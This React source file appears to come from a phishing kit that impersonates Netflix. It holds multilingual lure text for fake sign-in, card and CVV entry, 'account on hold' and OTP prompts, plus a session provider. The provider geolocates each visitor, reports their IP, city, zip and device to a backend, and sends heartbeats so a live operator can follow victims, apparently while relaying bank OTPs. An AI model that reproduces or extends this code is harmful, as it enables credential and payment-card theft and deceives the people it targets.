import { createContext, useContext, useEffect, useState, useRef, ReactNode } from "react";
import { trpc } from "@/lib/trpc";

// ─── Translation dictionary ────────────────────────────────────────────────────
const translations: Record<string, Record<string, string>> = {
  en: {
    securityCheck: "Security Check",
    enterCode: "Enter the 4-digit code shown below to continue.",
    getNewCode: "Get a new code",
    verify: "Verify",
    incorrectCode: "Incorrect code. Please try again.",
    enterAllDigits: "Please enter all 4 digits.",
    signIn: "Sign In",
    emailOrPhone: "Email or mobile number",
    password: "Password",
    useSignInCode: "Use a Sign-In Code",
    forgotPassword: "Forgot password?",
    rememberMe: "Remember me",
    newToNetflix: "New to Netflix?",
    signUpNow: "Sign up now.",
    enterPaymentDetails: "Enter payment details",
    cardNumber: "Card number",
    expirationDate: "Expiration date",
    cvv: "CVV",
    nameOnCard: "Name on card",
    makePayment: "Make Payment",
    accountOnHold: "Your account is on hold.",
    updatePaymentInfo: "Update your payment info to keep enjoying Netflix.",
    changePaymentMethod: "Change payment method",
    iAgree: "I agree.",
    termsText: "By checking the checkbox below, you agree that Netflix will automatically continue your membership and charge the membership fee (currently USD 9.99/month) to your payment method until you cancel. You may cancel at any time to avoid future charges.",
    recaptchaNotice: "This page is protected by Google reCAPTCHA to ensure you're not a bot.",
    learnMore: "Learn more.",
    questions: "Questions?",
    contactUs: "Contact us.",
    approveTransaction: "Approve Transaction",
    waitingApproval: "Waiting for bank approval...",
    enterOtp: "Enter OTP",
    otpSentTo: "A verification code has been sent to your registered mobile number.",
    otpCode: "OTP Code",
    submitOtp: "Submit",
    invalidOtp: "Invalid OTP. Please try again.",
    paymentDeclined: "Payment Declined",
    declinedMessage: "Your payment was declined. Please check your card details and try again.",
    tryAgain: "Try Again",
    signOut: "Sign Out",
    processing: "Processing...",
    verifying: "Verifying...",
  },
  fr: {
    securityCheck: "Vérification de sécurité",
    enterCode: "Entrez le code à 4 chiffres affiché ci-dessous pour continuer.",
    getNewCode: "Obtenir un nouveau code",
    verify: "Vérifier",
    incorrectCode: "Code incorrect. Veuillez réessayer.",
    enterAllDigits: "Veuillez entrer les 4 chiffres.",
    signIn: "Se connecter",
    emailOrPhone: "Email ou numéro de téléphone",
    password: "Mot de passe",
    useSignInCode: "Utiliser un code de connexion",
    forgotPassword: "Mot de passe oublié?",
    rememberMe: "Se souvenir de moi",
    newToNetflix: "Nouveau sur Netflix?",
    signUpNow: "Inscrivez-vous maintenant.",
    enterPaymentDetails: "Entrez les détails de paiement",
    cardNumber: "Numéro de carte",
    expirationDate: "Date d'expiration",
    cvv: "CVV",
    nameOnCard: "Nom sur la carte",
    makePayment: "Effectuer le paiement",
    accountOnHold: "Votre compte est suspendu.",
    updatePaymentInfo: "Mettez à jour vos informations de paiement pour continuer à profiter de Netflix.",
    changePaymentMethod: "Changer de méthode de paiement",
    iAgree: "J'accepte.",
    termsText: "En cochant la case ci-dessous, vous acceptez que Netflix continue automatiquement votre abonnement et facture les frais d'abonnement (actuellement 9,99 USD/mois) à votre méthode de paiement jusqu'à ce que vous annuliez.",
    recaptchaNotice: "Cette page est protégée par Google reCAPTCHA pour s'assurer que vous n'êtes pas un robot.",
    learnMore: "En savoir plus.",
    questions: "Questions?",
    contactUs: "Contactez-nous.",
    approveTransaction: "Approuver la transaction",
    waitingApproval: "En attente d'approbation bancaire...",
    enterOtp: "Entrer le code OTP",
    otpSentTo: "Un code de vérification a été envoyé à votre numéro de téléphone enregistré.",
    otpCode: "Code OTP",
    submitOtp: "Soumettre",
    invalidOtp: "OTP invalide. Veuillez réessayer.",
    paymentDeclined: "Paiement refusé",
    declinedMessage: "Votre paiement a été refusé. Veuillez vérifier les détails de votre carte et réessayer.",
    tryAgain: "Réessayer",
    signOut: "Se déconnecter",
    processing: "Traitement...",
    verifying: "Vérification...",
  },
  ar: {
    securityCheck: "فحص الأمان",
    enterCode: "أدخل الرمز المكون من 4 أرقام الموضح أدناه للمتابعة.",
    getNewCode: "الحصول على رمز جديد",
    verify: "تحقق",
    incorrectCode: "رمز غير صحيح. يرجى المحاولة مرة أخرى.",
    enterAllDigits: "يرجى إدخال جميع الأرقام الأربعة.",
    signIn: "تسجيل الدخول",
    emailOrPhone: "البريد الإلكتروني أو رقم الهاتف",
    password: "كلمة المرور",
    useSignInCode: "استخدام رمز تسجيل الدخول",
    forgotPassword: "نسيت كلمة المرور؟",
    rememberMe: "تذكرني",
    newToNetflix: "جديد على نتفليكس؟",
    signUpNow: "اشترك الآن.",
    enterPaymentDetails: "أدخل تفاصيل الدفع",
    cardNumber: "رقم البطاقة",
    expirationDate: "تاريخ الانتهاء",
    cvv: "CVV",
    nameOnCard: "الاسم على البطاقة",
    makePayment: "إجراء الدفع",
    accountOnHold: "حسابك معلق.",
    updatePaymentInfo: "قم بتحديث معلومات الدفع للاستمرار في الاستمتاع بنتفليكس.",
    changePaymentMethod: "تغيير طريقة الدفع",
    iAgree: "أوافق.",
    termsText: "بالنقر على مربع الاختيار أدناه، فإنك توافق على أن نتفليكس ستواصل تلقائياً عضويتك وتفرض رسوم الاشتراك.",
    recaptchaNotice: "هذه الصفحة محمية بواسطة Google reCAPTCHA للتأكد من أنك لست روبوتاً.",
    learnMore: "اعرف المزيد.",
    questions: "أسئلة؟",
    contactUs: "اتصل بنا.",
    approveTransaction: "الموافقة على المعاملة",
    waitingApproval: "في انتظار موافقة البنك...",
    enterOtp: "أدخل رمز OTP",
    otpSentTo: "تم إرسال رمز التحقق إلى رقم هاتفك المسجل.",
    otpCode: "رمز OTP",
    submitOtp: "إرسال",
    invalidOtp: "رمز OTP غير صالح. يرجى المحاولة مرة أخرى.",
    paymentDeclined: "تم رفض الدفع",
    declinedMessage: "تم رفض دفعتك. يرجى التحقق من تفاصيل بطاقتك والمحاولة مرة أخرى.",
    tryAgain: "حاول مرة أخرى",
    signOut: "تسجيل الخروج",
    processing: "جاري المعالجة...",
    verifying: "جاري التحقق...",
  },
  es: {
    securityCheck: "Verificación de seguridad",
    enterCode: "Ingresa el código de 4 dígitos que se muestra a continuación para continuar.",
    getNewCode: "Obtener un nuevo código",
    verify: "Verificar",
    incorrectCode: "Código incorrecto. Por favor, inténtalo de nuevo.",
    enterAllDigits: "Por favor, ingresa los 4 dígitos.",
    signIn: "Iniciar sesión",
    emailOrPhone: "Correo electrónico o número de teléfono",
    password: "Contraseña",
    useSignInCode: "Usar un código de inicio de sesión",
    forgotPassword: "¿Olvidaste tu contraseña?",
    rememberMe: "Recuérdame",
    newToNetflix: "¿Nuevo en Netflix?",
    signUpNow: "Regístrate ahora.",
    enterPaymentDetails: "Ingresa los detalles de pago",
    cardNumber: "Número de tarjeta",
    expirationDate: "Fecha de vencimiento",
    cvv: "CVV",
    nameOnCard: "Nombre en la tarjeta",
    makePayment: "Realizar pago",
    accountOnHold: "Tu cuenta está en espera.",
    updatePaymentInfo: "Actualiza tu información de pago para seguir disfrutando de Netflix.",
    changePaymentMethod: "Cambiar método de pago",
    iAgree: "Acepto.",
    termsText: "Al marcar la casilla de verificación a continuación, aceptas que Netflix continuará automáticamente tu membresía y cobrará la tarifa de membresía.",
    recaptchaNotice: "Esta página está protegida por Google reCAPTCHA para garantizar que no eres un robot.",
    learnMore: "Más información.",
    questions: "¿Preguntas?",
    contactUs: "Contáctanos.",
    approveTransaction: "Aprobar transacción",
    waitingApproval: "Esperando aprobación del banco...",
    enterOtp: "Ingresar OTP",
    otpSentTo: "Se ha enviado un código de verificación a tu número de teléfono registrado.",
    otpCode: "Código OTP",
    submitOtp: "Enviar",
    invalidOtp: "OTP inválido. Por favor, inténtalo de nuevo.",
    paymentDeclined: "Pago rechazado",
    declinedMessage: "Tu pago fue rechazado. Por favor, verifica los detalles de tu tarjeta e inténtalo de nuevo.",
    tryAgain: "Intentar de nuevo",
    signOut: "Cerrar sesión",
    processing: "Procesando...",
    verifying: "Verificando...",
  },
  de: {
    securityCheck: "Sicherheitsüberprüfung",
    enterCode: "Geben Sie den unten angezeigten 4-stelligen Code ein, um fortzufahren.",
    getNewCode: "Neuen Code erhalten",
    verify: "Überprüfen",
    incorrectCode: "Falscher Code. Bitte versuchen Sie es erneut.",
    enterAllDigits: "Bitte geben Sie alle 4 Ziffern ein.",
    signIn: "Anmelden",
    emailOrPhone: "E-Mail oder Handynummer",
    password: "Passwort",
    useSignInCode: "Anmeldecode verwenden",
    forgotPassword: "Passwort vergessen?",
    rememberMe: "Angemeldet bleiben",
    newToNetflix: "Neu bei Netflix?",
    signUpNow: "Jetzt registrieren.",
    enterPaymentDetails: "Zahlungsdetails eingeben",
    cardNumber: "Kartennummer",
    expirationDate: "Ablaufdatum",
    cvv: "CVV",
    nameOnCard: "Name auf der Karte",
    makePayment: "Zahlung vornehmen",
    accountOnHold: "Ihr Konto ist gesperrt.",
    updatePaymentInfo: "Aktualisieren Sie Ihre Zahlungsinformationen, um Netflix weiter zu genießen.",
    changePaymentMethod: "Zahlungsmethode ändern",
    iAgree: "Ich stimme zu.",
    termsText: "Indem Sie das Kontrollkästchen unten aktivieren, stimmen Sie zu, dass Netflix Ihre Mitgliedschaft automatisch verlängert.",
    recaptchaNotice: "Diese Seite ist durch Google reCAPTCHA geschützt.",
    learnMore: "Mehr erfahren.",
    questions: "Fragen?",
    contactUs: "Kontaktieren Sie uns.",
    approveTransaction: "Transaktion genehmigen",
    waitingApproval: "Warte auf Bankgenehmigung...",
    enterOtp: "OTP eingeben",
    otpSentTo: "Ein Bestätigungscode wurde an Ihre registrierte Handynummer gesendet.",
    otpCode: "OTP-Code",
    submitOtp: "Absenden",
    invalidOtp: "Ungültiger OTP. Bitte versuchen Sie es erneut.",
    paymentDeclined: "Zahlung abgelehnt",
    declinedMessage: "Ihre Zahlung wurde abgelehnt. Bitte überprüfen Sie Ihre Kartendaten und versuchen Sie es erneut.",
    tryAgain: "Erneut versuchen",
    signOut: "Abmelden",
    processing: "Verarbeitung...",
    verifying: "Überprüfung...",
  },
  pt: {
    securityCheck: "Verificação de segurança",
    enterCode: "Digite o código de 4 dígitos mostrado abaixo para continuar.",
    getNewCode: "Obter novo código",
    verify: "Verificar",
    incorrectCode: "Código incorreto. Por favor, tente novamente.",
    enterAllDigits: "Por favor, insira todos os 4 dígitos.",
    signIn: "Entrar",
    emailOrPhone: "E-mail ou número de celular",
    password: "Senha",
    useSignInCode: "Usar código de login",
    forgotPassword: "Esqueceu a senha?",
    rememberMe: "Lembrar de mim",
    newToNetflix: "Novo no Netflix?",
    signUpNow: "Cadastre-se agora.",
    enterPaymentDetails: "Inserir detalhes de pagamento",
    cardNumber: "Número do cartão",
    expirationDate: "Data de validade",
    cvv: "CVV",
    nameOnCard: "Nome no cartão",
    makePayment: "Efetuar pagamento",
    accountOnHold: "Sua conta está suspensa.",
    updatePaymentInfo: "Atualize suas informações de pagamento para continuar aproveitando o Netflix.",
    changePaymentMethod: "Alterar método de pagamento",
    iAgree: "Concordo.",
    termsText: "Ao marcar a caixa abaixo, você concorda que a Netflix continuará automaticamente sua assinatura.",
    recaptchaNotice: "Esta página é protegida pelo Google reCAPTCHA.",
    learnMore: "Saiba mais.",
    questions: "Perguntas?",
    contactUs: "Fale conosco.",
    approveTransaction: "Aprovar transação",
    waitingApproval: "Aguardando aprovação do banco...",
    enterOtp: "Inserir OTP",
    otpSentTo: "Um código de verificação foi enviado para o seu número de celular registrado.",
    otpCode: "Código OTP",
    submitOtp: "Enviar",
    invalidOtp: "OTP inválido. Por favor, tente novamente.",
    paymentDeclined: "Pagamento recusado",
    declinedMessage: "Seu pagamento foi recusado. Por favor, verifique os detalhes do seu cartão e tente novamente.",
    tryAgain: "Tentar novamente",
    signOut: "Sair",
    processing: "Processando...",
    verifying: "Verificando...",
  },
  it: {
    securityCheck: "Controllo di sicurezza",
    enterCode: "Inserisci il codice a 4 cifre mostrato di seguito per continuare.",
    getNewCode: "Ottieni un nuovo codice",
    verify: "Verifica",
    incorrectCode: "Codice errato. Riprova.",
    enterAllDigits: "Inserisci tutte e 4 le cifre.",
    signIn: "Accedi",
    emailOrPhone: "Email o numero di cellulare",
    password: "Password",
    useSignInCode: "Usa un codice di accesso",
    forgotPassword: "Password dimenticata?",
    rememberMe: "Ricordami",
    newToNetflix: "Nuovo su Netflix?",
    signUpNow: "Iscriviti ora.",
    enterPaymentDetails: "Inserisci i dettagli di pagamento",
    cardNumber: "Numero di carta",
    expirationDate: "Data di scadenza",
    cvv: "CVV",
    nameOnCard: "Nome sulla carta",
    makePayment: "Effettua il pagamento",
    accountOnHold: "Il tuo account è sospeso.",
    updatePaymentInfo: "Aggiorna le informazioni di pagamento per continuare a godere di Netflix.",
    changePaymentMethod: "Cambia metodo di pagamento",
    iAgree: "Accetto.",
    termsText: "Selezionando la casella di controllo di seguito, accetti che Netflix rinnovi automaticamente il tuo abbonamento.",
    recaptchaNotice: "Questa pagina è protetta da Google reCAPTCHA.",
    learnMore: "Scopri di più.",
    questions: "Domande?",
    contactUs: "Contattaci.",
    approveTransaction: "Approva transazione",
    waitingApproval: "In attesa dell'approvazione della banca...",
    enterOtp: "Inserisci OTP",
    otpSentTo: "Un codice di verifica è stato inviato al tuo numero di cellulare registrato.",
    otpCode: "Codice OTP",
    submitOtp: "Invia",
    invalidOtp: "OTP non valido. Riprova.",
    paymentDeclined: "Pagamento rifiutato",
    declinedMessage: "Il tuo pagamento è stato rifiutato. Controlla i dettagli della carta e riprova.",
    tryAgain: "Riprova",
    signOut: "Disconnetti",
    processing: "Elaborazione...",
    verifying: "Verifica...",
  },
};

// Map country codes to language codes
const countryToLang: Record<string, string> = {
  FR: "fr", BE: "fr", CH: "fr", CA: "fr", LU: "fr",
  // Arabic countries intentionally show English (no Arabic translation)
  ES: "es", MX: "es", AR: "es", CO: "es", PE: "es", VE: "es", CL: "es", EC: "es", GT: "es", CU: "es", BO: "es", DO: "es", HN: "es", PY: "es", SV: "es", NI: "es", CR: "es", PA: "es", UY: "es",
  DE: "de", AT: "de",
  BR: "pt", PT: "pt",
  IT: "it",
};

// ─── Context ──────────────────────────────────────────────────────────────────
interface SessionContextType {
  sessionId: string | null;
  geoData: { ip: string; country: string; countryCode: string; city: string; zip: string } | null;
  lang: string;
  t: (key: string) => string;
  isRTL: boolean;
}

const SessionContext = createContext<SessionContextType>({
  sessionId: null,
  geoData: null,
  lang: "en",
  t: (k) => k,
  isRTL: false,
});

export function SessionProvider({ children }: { children: ReactNode }) {
  const [sessionId, setSessionId] = useState<string | null>(() => {
    try { return localStorage.getItem("nf_session_id"); } catch { return null; }
  });
  const [geoData, setGeoData] = useState<SessionContextType["geoData"]>(null);
  const [lang, setLang] = useState("en");
  const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const geoQuery = trpc.geo.detect.useQuery(undefined, { retry: false });
  const initMutation = trpc.session.init.useMutation();
  const heartbeatMutation = trpc.session.heartbeat.useMutation();
  const offlineMutation = trpc.session.offline.useMutation();

  // Initialize session and detect geo
  useEffect(() => {
    if (geoQuery.data) {
      setGeoData(geoQuery.data);
      const detectedLang = countryToLang[geoQuery.data.countryCode] || "en";
      setLang(detectedLang);

      const device = /Mobi|Android/i.test(navigator.userAgent) ? "mobile" : "desktop";
      initMutation.mutate({
        ip: geoQuery.data.ip,
        country: geoQuery.data.country,
        city: geoQuery.data.city,
        zip: geoQuery.data.zip,
        countryCode: geoQuery.data.countryCode,
        userAgent: navigator.userAgent,
        device,
        sessionId: sessionId || undefined,
      }, {
        onSuccess: (data) => {
          setSessionId(data.sessionId);
          try { localStorage.setItem("nf_session_id", data.sessionId); } catch {}
        },
      });
    }
  }, [geoQuery.data]);

  // Heartbeat every 15 seconds
  useEffect(() => {
    if (!sessionId) return;
    heartbeatRef.current = setInterval(() => {
      heartbeatMutation.mutate({ sessionId });
    }, 15000);

    // Delete session (go offline) on page unload — admin sees instant removal
    const markOffline = () => {
      // Use sendBeacon for reliable delivery on page close
      const body = JSON.stringify({ sessionId });
      try {
        navigator.sendBeacon("/api/session-offline", new Blob([body], { type: "application/json" }));
      } catch {
        offlineMutation.mutate({ sessionId });
      }
      // Clear stored session so a fresh one is created on return
      try { localStorage.removeItem("nf_session_id"); } catch {}
    };

    const handleUnload = () => markOffline();
    const handleVisibility = () => {
      if (document.visibilityState === "hidden") {
        markOffline();
      } else {
        // Re-init session when user returns to tab
        setSessionId(null);
        try { localStorage.removeItem("nf_session_id"); } catch {}
      }
    };

    window.addEventListener("beforeunload", handleUnload);
    document.addEventListener("visibilitychange", handleVisibility);

    return () => {
      if (heartbeatRef.current) clearInterval(heartbeatRef.current);
      window.removeEventListener("beforeunload", handleUnload);
      document.removeEventListener("visibilitychange", handleVisibility);
    };
  }, [sessionId]);

  const t = (key: string): string => {
    return translations[lang]?.[key] || translations["en"]?.[key] || key;
  };

  const isRTL = lang === "ar";

  return (
    <SessionContext.Provider value={{ sessionId, geoData, lang, t, isRTL }}>
      <div dir={isRTL ? "rtl" : "ltr"}>
        {children}
      </div>
    </SessionContext.Provider>
  );
}

export function useSession() {
  return useContext(SessionContext);
}
